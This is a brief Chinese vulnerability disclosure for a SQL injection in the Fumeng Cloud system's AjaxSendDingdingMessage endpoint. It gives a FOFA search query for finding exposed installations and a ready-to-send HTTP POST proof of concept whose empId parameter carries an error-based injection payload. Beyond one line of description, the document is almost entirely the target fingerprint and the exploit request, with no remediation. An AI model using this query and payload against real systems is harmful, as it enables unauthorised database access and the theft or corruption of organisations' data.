# 孚盟云系统接口ajaxsenddingdingmessage存在SQL注入漏洞

孚盟云系统接口ajaxsenddingdingmessage存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。

## fofa

```javascript
body="hidLicResult" && body="hidProductID"
```

## poc

```javascript
POST /m/Dingding/Ajax/AjaxSendDingdingMessage.ashx HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15X-Requested-With: XMLHttpRequest
Content-Length: 51

action=SendDingMeg_Mail&empId=2'+and+1=@@VERSION--+
```

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409272016507.jpeg)